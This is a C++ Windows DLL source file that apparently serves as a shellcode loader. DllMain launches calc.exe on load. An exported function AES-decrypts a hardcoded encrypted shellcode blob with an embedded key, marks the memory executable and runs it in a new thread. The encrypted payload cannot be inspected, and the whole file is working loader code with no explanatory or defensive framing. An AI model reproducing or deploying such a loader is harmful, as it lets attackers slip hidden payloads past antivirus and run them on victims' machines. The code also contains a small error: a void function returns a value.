#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <math.h>
#include <windows.h>
#include <winsock2.h>
#include <stdio.h>
#include <ctime>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")
#pragma comment(lib, "ntdll")


BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        WinExec("calc.exe",0);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, (BYTE*)key, keyLen, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen);

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}

extern "C" __declspec(dllexport) void coolboy()
{

    MessageBoxA(NULL, "dhanush", "0x1337", 0);
    unsigned char AESkey[] = { 0xad, 0xc5, 0x4a, 0x23, 0xc3, 0xf1, 0x62, 0xa2, 0x64, 0x55, 0xd8, 0xb1, 0x1d, 0x6a, 0x87, 0x43 };
    unsigned char AEScode[] = { 0xf, 0x55, 0x67, 0x60, 0x6f, 0x77, 0xfe, 0xf, 0x71, 0x5e, 0x2, 0x5e, 0x60, 0xda, 0x22, 0xe9, 0x8f, 0xf9, 0x65, 0x75, 0x28, 0x11, 0x3d, 0xdc, 0xae, 0xd6, 0x1e, 0xb, 0x98, 0x64, 0xa3, 0xe6, 0xcb, 0x1c, 0xf9, 0x87, 0xc5, 0xce, 0xfa, 0x37, 0xc6, 0xa6, 0x31, 0xe6, 0xa4, 0x45, 0xcc, 0xa4, 0x9c, 0xac, 0x33, 0x6, 0x1f, 0x56, 0x45, 0xe, 0xef, 0x18, 0x4f, 0x9b, 0x36, 0x2, 0x93, 0xca, 0x8e, 0xc8, 0xd4, 0x87, 0x4, 0xbd, 0x18, 0xd0, 0x84, 0x74, 0x3a, 0x41, 0x60, 0x4b, 0x93, 0xc, 0xd5, 0xb0, 0x63, 0x30, 0x2c, 0xa7, 0x82, 0xc3, 0xd6, 0x9d, 0x52, 0x25, 0x1b, 0x99, 0xe7, 0x39, 0xd4, 0xa9, 0x99, 0x2a, 0x68, 0xa3, 0xbc, 0x2d, 0xa9, 0xbe, 0x57, 0x12, 0x23, 0x9d, 0x6, 0x9c, 0xb5, 0x34, 0xec, 0x44, 0xaf, 0x8e, 0x97, 0x77, 0xf8, 0x48, 0x7b, 0xd8, 0x45, 0x78, 0xee, 0xcf, 0x94, 0x45, 0x41, 0x66, 0xca, 0x7f, 0x9d, 0xce, 0x73, 0x93, 0xfa, 0x8a, 0x75, 0xc0, 0xf2, 0x34, 0xf2, 0x7e, 0x10, 0x24, 0xd8, 0x97, 0x85, 0x2a, 0xd9, 0xd6, 0xa, 0x36, 0x51, 0x3b, 0x12, 0xec, 0x92, 0x6b, 0xd9, 0xa6, 0x43, 0xab, 0x3, 0xeb, 0x58, 0xec, 0x51, 0x88, 0x2c, 0xd6, 0x4f, 0x74, 0xd0, 0xea, 0xdd, 0xff, 0xcb, 0x26, 0xe3, 0x7e, 0xd, 0xa, 0xa3, 0xb3, 0xfd, 0x19, 0x7e, 0xb7, 0xb4, 0x4f, 0x59, 0x31, 0x23, 0xad, 0x51, 0x59, 0x27, 0x6e, 0x40, 0xe6, 0xac, 0x9a, 0x1a, 0xf3, 0x49, 0xee, 0x36, 0x20, 0xea, 0x33, 0x9, 0xe4, 0xfc, 0x54, 0x97, 0x2b, 0x23, 0x36, 0x3f, 0xd8, 0x16, 0xb4, 0xe3, 0x2d, 0x70, 0x75, 0x9e, 0xa2, 0x90, 0xf4, 0xf8, 0x52, 0xd7, 0xef, 0x9a, 0x1a, 0xc6, 0xf5, 0xe3, 0x59, 0xa0, 0x16, 0xdb, 0x93, 0x80, 0x51, 0x99, 0x3b, 0x44, 0xf6, 0x7, 0x4, 0x5a, 0x8, 0xb6, 0x1a, 0xd4, 0xa4, 0xa2, 0xf, 0xcb, 0xf8, 0x5f, 0xe5, 0x33, 0xb8, 0x8a, 0xc3, 0x93, 0xaa, 0x84, 0x70, 0x5f, 0x61, 0xc, 0x1a, 0xaa, 0xac, 0x2f, 0xfe, 0x9c, 0xd8, 0x5, 0xaf, 0x1b, 0x81, 0xaa, 0xe6, 0xd8, 0x9e, 0x5d, 0x41, 0x42, 0xaf, 0x2f, 0xb9, 0x69, 0xd, 0x74, 0x8d, 0x8, 0xcf, 0x39, 0xf7, 0x7f, 0x50, 0xb1, 0xbc, 0x9, 0x62, 0xba, 0x38, 0xa, 0x54, 0x80, 0x26, 0x76, 0xa1, 0x10, 0xb2, 0xc4, 0x75, 0x94, 0x82, 0xb1, 0x92, 0x5, 0x8f, 0x8f, 0x36, 0x28, 0x30, 0x73, 0x3b, 0xab, 0x2b, 0xec, 0x71, 0xb6, 0x21, 0xbc, 0x2f, 0xea, 0xc7, 0xb6, 0xb2, 0xc1, 0x79, 0x80, 0x29, 0x46, 0x7d, 0x2, 0x35, 0xdf, 0xca, 0x7e, 0x9f, 0x93, 0xc1, 0xd8, 0x8f, 0xd8, 0x5, 0x1b, 0xa1, 0x2a, 0xb0, 0xe9, 0x5f, 0x36, 0x99, 0x0, 0x2c, 0x8d, 0x35, 0x6f, 0x20, 0x90, 0xe4, 0x13, 0x42, 0x89, 0x6f, 0xec, 0x88, 0x2f, 0x5a, 0x54, 0x82, 0xc5, 0x26, 0x36, 0x3, 0xef, 0x3d, 0x61, 0xec, 0xaf, 0x58, 0x9c, 0x9e, 0x2a, 0x77, 0xc8, 0xf5, 0xed, 0xb, 0xed, 0xfe, 0x8e, 0xd1, 0xc2, 0xcf, 0xd8, 0x48, 0x56, 0x53, 0x31, 0xa9, 0xef, 0xff, 0xe3, 0x48, 0x95, 0x98, 0xb6, 0xd2, 0xe6, 0x7c, 0xc6, 0x85, 0x4d, 0x3f, 0x64, 0xf1, 0x37, 0xb5, 0x17, 0xa8, 0xd8, 0x82, 0x27, 0x15, 0xf6, 0xa6, 0xc6, 0x31, 0xd5, 0x1, 0xe2, 0xd2, 0xfb, 0xdc, 0x8f, 0x52, 0x3c, 0x9c, 0xd6, 0x6f };
  

        DWORD sizeAES= sizeof(AEScode);

	LPVOID memmlo=VirtualAllocEx(GetCurrentProcess(),NULL,sizeof(AEScode), MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE);

	DecryptAES((char*)  AEScode, sizeAES, AESkey, sizeof(AESkey));
	MoveMemory(memmlo, AEScode, sizeof(AEScode));
	//RtlMoveMemory(alloc_mem, payload, sizeof(AEScode));


	DWORD oldProtect;

	VirtualProtect(memmlo, sizeof(AEScode), PAGE_EXECUTE_READ, &oldProtect);


	HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)memmlo, NULL, 0, NULL);

	printf("\n\nalloc_mem : %p\n", memmlo);
	WaitForSingleObject(tHandle, INFINITE);
	getchar();
	// or

	//((void(*)())alloc_mem)();
        return 0;
       
}